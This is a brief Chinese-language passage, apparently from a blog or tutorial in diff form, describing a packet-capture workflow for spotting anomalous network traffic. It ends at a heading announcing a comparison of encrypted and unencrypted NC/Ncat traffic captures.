+<p>一般流程： 检查信息统计是比较重要的一个阶段，一般的流程则是先开启混杂模式抓取大量的数据包，之后设置筛选信息（统计信息先下手），看看哪个机器发送了大量的数据流量包，再看看哪些机器流量最大，一般发送了大量的包是有问题的，然后将这些有问题的数据流量来源地址筛选出来，再根据异常情况以及抓取的包的结果进行分析，大概是哪个方向导致了网络的一个不正常的情况，有了这个方向之后，再次进行各种筛选功能，把可能存在问题的包给筛选出来，再逐个分析报的内容，这样会比较快捷的，有方法，有方向的去发现网络中的问题。</p>
+<h2 id="实践">实践</h2>
+<p><strong>抓包对比NC，NCAT加密与不加密的流量</strong></p>
 
             </div>
             
